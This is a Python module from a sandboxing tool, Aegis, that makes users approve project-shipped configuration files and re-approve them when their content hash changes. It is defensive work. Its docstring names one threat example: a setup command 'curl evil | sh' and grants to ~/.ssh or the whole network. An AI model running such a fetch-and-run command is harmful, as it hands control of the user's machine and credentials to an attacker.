# SPDX-License-Identifier: AGPL-3.0-or-later
"""Trust on first use for configuration that comes with a project.

`.aegis/profiles/*.json` and `.aegis/task.json` live in the repository, so a
cloned repo can ship them. A malicious one could grant itself `~/.ssh`, the
whole network or a setup command such as `curl evil | sh`. Aegis therefore
uses a project's config only after the user has seen it and agreed, and asks
again whenever the file changes (by a teammate, a `git pull` or an agent).

Approvals are stored per user in ~/.aegis/trust.json as content hashes.
"""

from __future__ import annotations

import hashlib
import json
import sys
from pathlib import Path

from aegis_jail import paths


class Untrusted(RuntimeError):
    pass


def _store() -> Path:
    return paths.aegis_home() / "trust.json"


def _load() -> dict:
    try:
        return json.loads(_store().read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return {}


def _digest(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def is_trusted(path: Path) -> bool:
    path = path.resolve()
    return _load().get(str(path)) == _digest(path)


def record(path: Path) -> None:
    path = path.resolve()
    data = _load()
    data[str(path)] = _digest(path)
    store = _store()
    tmp = store.with_suffix(".tmp")
    tmp.write_text(json.dumps(data, indent=1), encoding="utf-8")
    tmp.replace(store)


def summary(path: Path) -> str:
    """What the file would let Aegis do - shown before asking for trust."""
    from aegis_jail.textsafe import for_terminal
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError) as e:
        return f"  (unreadable: {e})"
    lines = []
    if "grants" in data:
        for g in data.get("grants", []):
            what = g.get("path") or ", ".join(g.get("domains") or g.get("names") or [])
            lines.append(f"  grant {g.get('kind')}: {what}" + (f"  [{g.get('phase')}]" if g.get("phase") else ""))
        if not lines:
            lines.append("  no extra access (strict base profile)")
    else:
        for key in ("agent", "prompt", "command", "setup", "verify"):
            if data.get(key):
                lines.append(f"  {key}: {data[key]}")
    return for_terminal("\n".join(lines))


def ensure(path: Path, *, interactive: bool | None = None) -> None:
    """Raise Untrusted unless path is trusted (asking on a terminal first)."""
    if not path.exists() or is_trusted(path):
        return
    if interactive is None:
        interactive = sys.stdin.isatty() and sys.stdout.isatty()
    msg = (f"{path} comes with the project and has not been approved on this machine "
           f"(new, or changed since you approved it). It would allow:\n{summary(path)}")
    if not interactive:
        raise Untrusted(msg + f"\nReview it, then run: aegis trust {path}")
    print(msg)
    if input("Trust this file? [y/N] ").strip().lower() in ("y", "yes", "t", "tak"):
        record(path)
        return
    raise Untrusted("not trusted - nothing was run")
